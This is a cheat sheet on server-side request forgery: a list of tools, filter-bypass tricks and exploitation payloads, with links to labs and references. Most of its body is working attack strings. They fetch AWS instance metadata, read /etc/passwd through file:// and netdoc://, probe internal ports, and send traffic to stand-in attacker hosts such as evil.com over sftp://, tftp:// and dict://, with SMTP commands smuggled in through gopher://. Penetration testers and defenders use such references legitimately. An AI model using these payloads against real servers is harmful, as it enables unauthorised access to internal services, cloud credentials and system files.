# Server-Side Request Forgery

> Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.


## Summary

* [Tools](#tools)
* [Methodology](#methodology)
* [Bypassing Filters](#bypassing-filters)
    * [Default Targets](#default-targets)
    * [Bypass Localhost with IPv6 Notation](#bypass-localhost-with-ipv6-notation)
    * [Bypass Localhost with a Domain Redirect](#bypass-localhost-with-a-domain-redirect)
    * [Bypass Localhost with CIDR](#bypass-localhost-with-cidr)
    * [Bypass Using Rare Address](#bypass-using-rare-address)
    * [Bypass Using an Encoded IP Address](#bypass-using-an-encoded-ip-address)
    * [Bypass Using Different Encoding](#bypass-using-different-encoding)
    * [Bypassing Using a Redirect](#bypassing-using-a-redirect)
    * [Bypass Using DNS Rebinding](#bypass-using-dns-rebinding)
    * [Bypass Abusing URL Parsing Discrepancy](#bypass-abusing-url-parsing-discrepancy)
    * [Bypass PHP filter_var() Function](#bypass-php-filter_var-function)
    * [Bypass Using JAR Scheme](#bypass-using-jar-scheme)
* [Exploitation via URL Scheme](#exploitation-via-url-scheme)
    * [file://](#file)
    * [http://](#http)
    * [dict://](#dict)
    * [sftp://](#sftp)
    * [tftp://](#tftp)
    * [ldap://](#ldap)
    * [gopher://](#gopher)
    * [netdoc://](#netdoc)
* [Blind Exploitation](#blind-exploitation)
* [Upgrade to XSS](#upgrade-to-xss)
* [Labs](#labs) 
* [References](#references)


## Tools

- [swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap) - Automatic SSRF fuzzer and exploitation tool
- [tarunkant/Gopherus](https://github.com/tarunkant/Gopherus) - Generates gopher link for exploiting SSRF and gaining RCE in various servers
- [In3tinct/See-SURF](https://github.com/In3tinct/See-SURF) - Python based scanner to find potential SSRF parameters
- [teknogeek/SSRF-Sheriff](https://github.com/teknogeek/ssrf-sheriff) - Simple SSRF-testing sheriff written in Go
- [assetnote/surf](https://github.com/assetnote/surf) - Returns a list of viable SSRF candidates
- [dwisiswant0/ipfuscator](https://github.com/dwisiswant0/ipfuscator) - A blazing-fast, thread-safe, straightforward and zero memory allocations tool to swiftly generate alternative IP(v4) address representations in Go.
- [Horlad/r3dir](https://github.com/Horlad/r3dir) - a redirection service designed to help bypass SSRF filters that do not validate the redirect location. Intergrated with Burp with help of Hackvertor tags


## Methodology

SSRF is a security vulnerability that occurs when an attacker manipulates a server to make HTTP requests to an unintended location. This happens when the server processes user-provided URLs or IP addresses without proper validation.

Common exploitation paths:

- Accessing Cloud metadata
- Leaking files on the server
- Network discovery, port scanning with the SSRF
- Sending packets to specific services on the network, usually to achieve a Remote Command Execution on another server


**Example**: A server accepts user input to fetch a URL.

```py
url = input("Enter URL:")
response = requests.get(url)
return response
```

An attacker supplies a malicious input:

```ps1
http://169.254.169.254/latest/meta-data/
```

This fetches sensitive information from the AWS EC2 metadata service.


## Bypassing Filters

### Default Targets

By default, Server-Side Request Forgery are used to access services hosted on `localhost` or hidden further on the network.

* Using `localhost`
  ```powershell
  http://localhost:80
  http://localhost:22
  https://localhost:443
  ```
* Using `127.0.0.1`
  ```powershell
  http://127.0.0.1:80
  http://127.0.0.1:22
  https://127.0.0.1:443
  ```
* Using `0.0.0.0`
  ```powershell
  http://0.0.0.0:80
  http://0.0.0.0:22
  https://0.0.0.0:443
  ```


### Bypass Localhost with IPv6 Notation

* Using unspecified address in IPv6 `[::]`
    ```powershell
    http://[::]:80/
    ```

* Using IPv6 loopback addres`[0000::1]`
    ```powershell
    http://[0000::1]:80/
    ```

* Using [IPv6/IPv4 Address Embedding](http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm)
    ```powershell
    http://[0:0:0:0:0:ffff:127.0.0.1]
    http://[::ffff:127.0.0.1]
    ```


### Bypass Localhost with a Domain Redirect

| Domain                       | Redirect to |
|------------------------------|-------------|
| localtest.me                 | `::1`       |
| localh.st                    | `127.0.0.1` |
| spoofed.[BURP_COLLABORATOR]  | `127.0.0.1` |
| spoofed.redacted.oastify.com | `127.0.0.1` |
| company.127.0.0.1.nip.io     | `127.0.0.1` |

The service `nip.io` is awesome for that, it will convert any ip address as a dns.

```powershell
NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1
```

### Bypass Localhost with CIDR 

The IP range `127.0.0.0/8` in IPv4 is reserved for loopback addresses. 

```powershell
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
```

If you try to use any address in this range (127.0.0.2, 127.1.1.1, etc.) in a network, it will still resolve to the local machine


### Bypass Using Rare Address

You can short-hand IP addresses by dropping the zeros

```powershell
http://0/
http://127.1
http://127.0.1
```


### Bypass Using an Encoded IP Address

* Decimal IP location
    ```powershell
    http://2130706433/ = http://127.0.0.1
    http://3232235521/ = http://192.168.0.1
    http://3232235777/ = http://192.168.1.1
    http://2852039166/ = http://169.254.169.254
    ```

* Octal IP: Implementations differ on how to handle octal format of IPv4.
    ```powershell
    http://0177.0.0.1/ = http://127.0.0.1
    http://o177.0.0.1/ = http://127.0.0.1
    http://0o177.0.0.1/ = http://127.0.0.1
    http://q177.0.0.1/ = http://127.0.0.1
    ```


### Bypass Using Different Encoding

* URL encoding: Single or double encode a specific URL to bypass blacklist
    ```powershell
    http://127.0.0.1/%61dmin
    http://127.0.0.1/%2561dmin
    ```

* Enclosed alphanumeric: `①②③④⑤⑥⑦⑧⑨⑩⑪⑫⑬⑭⑮⑯⑰⑱⑲⑳⑴⑵⑶⑷⑸⑹⑺⑻⑼⑽⑾⑿⒀⒁⒂⒃⒄⒅⒆⒇⒈⒉⒊⒋⒌⒍⒎⒏⒐⒑⒒⒓⒔⒕⒖⒗⒘⒙⒚⒛⒜⒝⒞⒟⒠⒡⒢⒣⒤⒥⒦⒧⒨⒩⒪⒫⒬⒭⒮⒯⒰⒱⒲⒳⒴⒵ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ⓪⓫⓬⓭⓮⓯⓰⓱⓲⓳⓴⓵⓶⓷⓸⓹⓺⓻⓼⓽⓾⓿`
    ```powershell
    http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
    ```

* Unicode encoding: In some languages (.NET, Python 3) regex supports unicode by default. `\d` includes `0123456789` but also `๐๑๒๓๔๕๖๗๘๙`.


### Bypassing Using a Redirect

1. Create a page on a whitelisted host that redirects requests to the SSRF the target URL (e.g. 192.168.0.1)
2. Launch the SSRF pointing to `vulnerable.com/index.php?url=http://redirect-server`
3. You can use response codes [HTTP 307](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/307) and [HTTP 308](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/308) in order to retain HTTP method and body after the redirection.

To perform redirects without hosting own redirect server or perform seemless redirect target fuzzing, use [Horlad/r3dir](https://github.com/Horlad/r3dir).


* Redirects to `http://localhost` with `307 Temporary Redirect` status code
    ```powershell
    https://307.r3dir.me/--to/?url=http://localhost
    ```

* Redirects to `http://169.254.169.254/latest/meta-data/` with `302 Found` status code
    ```powershell
    https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me
    ```


### Bypass Using DNS Rebinding

Create a domain that change between two IPs. 

* [1u.ms](http://1u.ms) - DNS rebinding utility

For example to rotate between `1.2.3.4` and `169.254-169.254`, use the following domain:

```powershell
make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
```

Verify the address with `nslookup`.

```ps1
$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Address: 1.2.3.4

$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Address: 169.254.169.254
```


### Bypass Abusing URL Parsing Discrepancy

[A New Era Of SSRF Exploiting URL Parser In Trending Programming Languages - Research from Orange Tsai](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

```powershell
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
```

![https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.png?raw=true](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.jpg?raw=true)


Parsing behavior by different libraries: `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/`

* `urllib2` treats `1.1.1.1` as the destination
* `requests` and browsers redirect to `2.2.2.2`
* `urllib` resolves to `3.3.3.3`



### Bypass PHP filter_var() Function

In PHP 7.0.25, `filter_var()` function with the parameter `FILTER_VALIDATE_URL` allows URL such as:

- `http://test???test.com`
- `0://evil.com:80;http://google.com:80/ `

```php
<?php 
	echo var_dump(filter_var("http://test???test.com", FILTER_VALIDATE_URL));
	echo var_dump(filter_var("0://evil.com;google.com", FILTER_VALIDATE_URL));
?>
```


### Bypass Using JAR Scheme

This attack technique is fully blind, you won't see the result.

```powershell
jar:scheme://domain/path!/ 
jar:http://127.0.0.1!/
jar:https://127.0.0.1!/
jar:ftp://127.0.0.1!/
```

## Exploitation via URL Scheme

### File

Allows an attacker to fetch the content of a file on the server. Transforming the SSRF into a file read.

```powershell
file:///etc/passwd
file://\/\/etc/passwd
```

### HTTP

Allows an attacker to fetch any content from the web, it can also be used to scan ports.

```powershell
ssrf.php?url=http://127.0.0.1:22
ssrf.php?url=http://127.0.0.1:80
ssrf.php?url=http://127.0.0.1:443
```

![SSRF stream](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/SSRF_stream.png?raw=true)


### Dict

The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:

```powershell
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/
```

### SFTP 

A network protocol used for secure file transfer over secure shell

```powershell
ssrf.php?url=sftp://evil.com:11111/
```

### TFTP

Trivial File Transfer Protocol, works over UDP

```powershell
ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
```

### LDAP

Lightweight Directory Access Protocol. It is an application protocol used over an IP network to manage and access the distributed directory information service.

```powershell
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
```


### Netdoc

Wrapper for Java when your payloads struggle with "`\n`" and "`\r`" characters.

```powershell
ssrf.php?url=netdoc:///etc/passwd
```


### Gopher

The `gopher://` protocol is a lightweight, text-based protocol that predates the modern World Wide Web. It was designed for distributing, searching, and retrieving documents over the Internet.

```ps1
gopher://[host]:[port]/[type][selector]
```

This scheme is very useful as it as be used to send data to TCP protocol.

```ps1
gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A
```

Refer to the SSRF Advanced Exploitation to explore the `gopher://` protocol deeper.


## Blind Exploitation

> When exploiting server-side request forgery, we can often find ourselves in a position where the response cannot be read. 

Use an SSRF chain to gain an Out-of-Band output: [assetnote/blind-ssrf-chains](https://github.com/assetnote/blind-ssrf-chains)

**Possible via HTTP(s)**

- [Elasticsearch](https://github.com/assetnote/blind-ssrf-chains#elasticsearch)
- [Weblogic](https://github.com/assetnote/blind-ssrf-chains#weblogic)
- [Hashicorp Consul](https://github.com/assetnote/blind-ssrf-chains#consul)
- [Shellshock](https://github.com/assetnote/blind-ssrf-chains#shellshock)
- [Apache Druid](https://github.com/assetnote/blind-ssrf-chains#druid)
- [Apache Solr](https://github.com/assetnote/blind-ssrf-chains#solr)
- [PeopleSoft](https://github.com/assetnote/blind-ssrf-chains#peoplesoft)
- [Apache Struts](https://github.com/assetnote/blind-ssrf-chains#struts)
- [JBoss](https://github.com/assetnote/blind-ssrf-chains#jboss)
- [Confluence](https://github.com/assetnote/blind-ssrf-chains#confluence)
- [Jira](https://github.com/assetnote/blind-ssrf-chains#jira)
- [Other Atlassian Products](https://github.com/assetnote/blind-ssrf-chains#atlassian-products)
- [OpenTSDB](https://github.com/assetnote/blind-ssrf-chains#opentsdb)
- [Jenkins](https://github.com/assetnote/blind-ssrf-chains#jenkins)
- [Hystrix Dashboard](https://github.com/assetnote/blind-ssrf-chains#hystrix)
- [W3 Total Cache](https://github.com/assetnote/blind-ssrf-chains#w3)
- [Docker](https://github.com/assetnote/blind-ssrf-chains#docker)
- [Gitlab Prometheus Redis Exporter](https://github.com/assetnote/blind-ssrf-chains#redisexporter)

**Possible via Gopher**

- [Redis](https://github.com/assetnote/blind-ssrf-chains#redis)
- [Memcache](https://github.com/assetnote/blind-ssrf-chains#memcache)
- [Apache Tomcat](https://github.com/assetnote/blind-ssrf-chains#tomcat)


## Upgrade to XSS

When the SSRF doesn't have any critical impact, the network is segmented and you can't reach other machine, the SSRF doesn't allow you to exfiltrate files from the server.

You can try to upgrade the SSRF to an XSS, by including an SVG file containing Javascript code.

```bash
https://example.com/ssrf.php?url=http://brutelogic.com.br/poc.svg
```


## Labs

* [PortSwigger - Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)
* [PortSwigger - Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)
* [PortSwigger - SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)
* [PortSwigger - SSRF with whitelist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)
* [PortSwigger - SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)
* [Root Me - Server Side Request Forgery](https://www.root-me.org/en/Challenges/Web-Server/Server-Side-Request-Forgery)
* [Root Me - Nginx - SSRF Misconfiguration](https://www.root-me.org/en/Challenges/Web-Server/Nginx-SSRF-Misconfiguration)


## References

- [A New Era Of SSRF - Exploiting URL Parsers - Orange Tsai - September 27, 2017](https://www.youtube.com/watch?v=D1S-G8rJrEk)
- [Blind SSRF on errors.hackerone.net - chaosbolt - June 30, 2018](https://hackerone.com/reports/374737)
- [ESEA Server-Side Request Forgery and Querying AWS Meta Data - Brett Buerhaus - April 18, 2016](http://buer.haus/2016/04/18/esea-server-side-request-forgery-and-querying-aws-meta-data/)
- [Hacker101 SSRF - Cody Brocious - October 29, 2018](https://www.youtube.com/watch?v=66ni2BTIjS8)
- [Hackerone - How To: Server-Side Request Forgery (SSRF) - Jobert Abma - June 14, 2017](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)
- [Hacking the Hackers: Leveraging an SSRF in HackerTarget - @sxcurity - December 17, 2017](http://web.archive.org/web/20171220083457/http://www.sxcurity.pro/2017/12/17/hackertarget/)
- [How I Chained 4 Vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! - Orange Tsai - July 28, 2017](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
- [Les Server Side Request Forgery : Comment contourner un pare-feu - Geluchat - September 16, 2017](https://www.dailysecurity.fr/server-side-request-forgery/)
- [PHP SSRF - @secjuice - theMiddle - March 1, 2018](https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51)
- [Piercing the Veil: Server Side Request Forgery to NIPRNet Access - Alyssa Herrera - April 9, 2018](https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a)
- [Server-side Browsing Considered Harmful - Nicolas Grégoire (Agarri) - May 21, 2015](https://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf)
- [SSRF - Server-Side Request Forgery (Types and Ways to Exploit It) Part-1 - SaN ThosH (madrobot) - January 10, 2019](https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978)
- [SSRF and Local File Read in Video to GIF Converter - sl1m - February 11, 2016](https://hackerone.com/reports/115857)
- [SSRF in https://imgur.com/vidgif/url - Eugene Farfel (aesteral) - February 10, 2016](https://hackerone.com/reports/115748)
- [SSRF in proxy.duckduckgo.com - Patrik Fábián (fpatrik) - May 27, 2018](https://hackerone.com/reports/358119)
- [SSRF on *shopifycloud.com - Rojan Rijal (rijalrojan) - July 17, 2018](https://hackerone.com/reports/382612)
- [SSRF Protocol Smuggling in Plaintext Credential Handlers: LDAP - Willis Vandevanter (@0xrst) - February 5, 2019](https://www.silentrobots.com/ssrf-protocol-smuggling-in-plaintext-credential-handlers-ldap/)
- [SSRF Tips - xl7dev - July 3, 2016](http://web.archive.org/web/20170407053309/http://blog.safebuff.com/2016/07/03/SSRF-Tips/)
- [SSRF's Up! Real World Server-Side Request Forgery (SSRF) - Alberto Wilson and Guillermo Gabarrin - January 25, 2019](https://www.shorebreaksecurity.com/blog/ssrfs-up-real-world-server-side-request-forgery-ssrf/)
- [SSRF脆弱性を利用したGCE/GKEインスタンスへの攻撃例 - mrtc0 - September 5, 2018](https://blog.ssrf.in/post/example-of-attack-on-gce-and-gke-instance-using-ssrf-vulnerability/)
- [SVG SSRF Cheatsheet - Allan Wirth (@allanlw) - June 12, 2019](https://github.com/allanlw/svg-cheatsheet)
- [URL Eccentricities in Java - sammy (@PwnL0rd) - November 2, 2020](http://web.archive.org/web/20201107113541/https://blog.pwnl0rd.me/post/lfi-netdoc-file-java/)
- [Web Security Academy Server-Side Request Forgery (SSRF) - PortSwigger - July 10, 2019](https://portswigger.net/web-security/ssrf)
- [X-CTF Finals 2016 - John Slick (Web 25) - YEO QUAN YANG (@quanyang) - June 22, 2016](https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/)